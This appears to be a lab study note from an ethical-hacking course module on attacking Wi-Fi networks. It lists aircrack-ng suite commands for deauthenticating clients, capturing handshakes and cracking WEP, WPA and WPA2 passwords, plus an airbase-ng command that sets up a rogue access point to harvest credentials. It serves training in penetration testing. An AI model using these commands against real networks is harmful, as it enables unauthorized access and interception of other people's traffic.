# Module 16

## Hacking Wireless Networks
Exploiting security weaknesses in Wi-Fi networks to gain unauthorized access.

**Objective**
To intercept data or use the network as a launch point for further attacks.

**Approach**
- Scan: Discover nearby networks and identify their security type (e.g., WPA2).
- Capture: Intercept the data exchanged when a device connects to the network.
- Crack: Break the encryption password using a brute-force or dictionary attack on the captured data.
- Access: Use the cracked password to join the network.

---

### 1. Footprint a wireless Network

#### 1.1 Find wifi networks with Netsurveyor
[NetSurveyor 802.11 Network Discovery Tool](https://nutsaboutnets.com/archives/netsurveyor-wifi-scanner/)

---

### 2. Perform Wireless Traffic Analysis

#### 2.1 Wi-Fi Packet Analysis using Wireshark
Wireshark is a network analysis tool that captures and inspects network traffic. Using the Npcap library, it can analyze wireless (Wi-Fi) traffic in monitor mode, capturing data, management, and control frames to examine details like protocols, encryption, and MAC addresses.

**Steps**:
- You can open a captured file in wireshark to analyze it.    
<img width="1024" height="768" alt="image" src="https://github.com/user-attachments/assets/69320d1a-ee8d-4149-8429-fbdf61e7e5f1" />    

- The 8.cap file opens in Wireshark window showing you the details of the packet for analysis. Here you can see the wireless packets captured which were otherwise masked to look like ethernet traffic.
- Here 802.11 protocol indicates wireless packets.    
- You can access the saved packet capture file anytime, and by issuing packet filtering commands in the Filter field, you can narrow down the packet search in an attempt to find packets containing sensible information.    
- In real time, attackers enforce packet capture and packet filtering techniques to capture packets containing passwords (only for websites implemented on HTTP channel), perform attacks such as session hijacking, and so on.    
<img width="1024" height="768" alt="image" src="https://github.com/user-attachments/assets/594f3854-86c5-4418-9a15-7b7331889cbd" />    

#### 2.2 Find wifi networks and sniff traffic with wash and wireshark
**Steps**:
- `airmon-ng start wlan0`
- `wash -i wlan0mon0`  to check WPS enable networks
Filter 802.11 packets in wireshark.    
You can also use other wireless traffic analyzers such as AirMagnet WiFi Analyzer PRO (https://www.netally.com), SteelCentral Packet Analyzer (https://www.riverbed.com), Omnipeek Network Protocol Analyzer (https://www.liveaction.com), and CommView for Wi-Fi (https://www.tamos.com) to analyze Wi-Fi traffic.

---

### 3. Perform Wireless Attacks

#### 3.1 Crack WEP using Aircrack-ng
**Steps**:
- `airmon-ng start wlan0`
- `airodump-ng`
- `airodump-ng –w "filename" -c "channel name"`
- `aireplay-ng -1 0 -a (bssid) -h (mac of your card) -e (essid) (interface)`
- `aireplay-ng -3 –b "bssid" -h "mac address"`
- `aireplay-ng --deauth 3 -a MAC_AP -c MAC_Client mon0`
- `aircrack-ng -b "filename.cap"`

#### 3.2 Crack WEP using WifiPhisher
[GitHub - wifiphisher/wifiphisher: The Rogue Access Point Framework](https://github.com/wifiphisher/wifiphisher)

#### 3.3 Crack WPA with FERN cracker
**Steps**:
- `airmon-ng start wlan0`
- `airodump-ng wlan0mon`
- `airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon`
- `aireplay-ng -0 2 -a <AP_MAC> -c <Client_MAC> wlan0mon`
- `aircrack-ng -w /path/to/wordlist.txt capture-01.cap`

#### 3.4 Crack WPA 2 with Aircrack
WPA2 is a strong security upgrade from WPA, using AES-based encryption (CCMP). It offers both Personal (password-based) and Enterprise (server-based) modes. Despite its strength, it can still be cracked, typically by capturing the network handshake and performing a dictionary or brute-force attack on the password.

In this task, we will use the Aircrack-ng suite to crack a WPA2 network.
- `aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap`
  - `-a` is the technique used to crack the handshake, 2=WPA technique.
  - `-b` refers to bssid; replace with the BSSID of the target router.
  - `-w` stands for wordlist; provide the path to a wordlist.
<img width="1024" height="768" alt="image" src="https://github.com/user-attachments/assets/d7ae2608-52de-440a-879c-6c1afa2e91c5" />
The result appears, showing the WPA handshake packet captured with airodump-ng. The target access point’s password is cracked and displayed in plain text next to the message KEY FOUND!, as shown in the screenshot.
<img width="1024" height="768" alt="image" src="https://github.com/user-attachments/assets/de6a4063-e85b-44b8-93bd-c6ddc12b82f8" />
[Hacking Wifi Networks with Aircrack suite | The Easiest Way](https://hackingplayground.blogspot.com/2022/07/hacking-wifi-networks-with-aircrack.html)    
You can also use other tools such as hashcat (https://hashcat.net), Portable Penetrator (https://www.secpoint.com), WepCrackGui (https://sourceforge.net) to crack WEP/WPA/WPA2 encryption.

#### 3.5 Create a Rogue access Point
A malicious wireless access point that mimics a legitimate one. The goal is to trick users into connecting to it, allowing you to monitor their traffic, steal credentials, or deliver malware.
- `airbase-ng -a [Target_AP_MAC] --essid "Trusted Network Name" -c 6 wlan0mon`

---
---
